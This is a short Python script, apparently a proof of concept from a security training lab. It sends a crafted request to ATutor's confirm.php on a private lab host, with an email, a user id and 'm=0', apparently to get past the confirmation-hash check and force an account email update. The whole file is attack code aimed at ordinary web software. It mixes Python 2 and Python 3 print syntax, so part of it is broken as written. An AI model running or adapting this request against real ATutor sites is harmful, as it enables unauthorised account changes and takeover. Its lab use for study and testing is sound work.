import requests



ip="192.168.126.103"
email="bmx@offsec.local"
id="1"

url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
print "(*) Issuing update request to URL: %s" % url
r = requests.get(url, allow_redirects=False)
print("request status: ", r.status_code)
print("text : ", r.text)
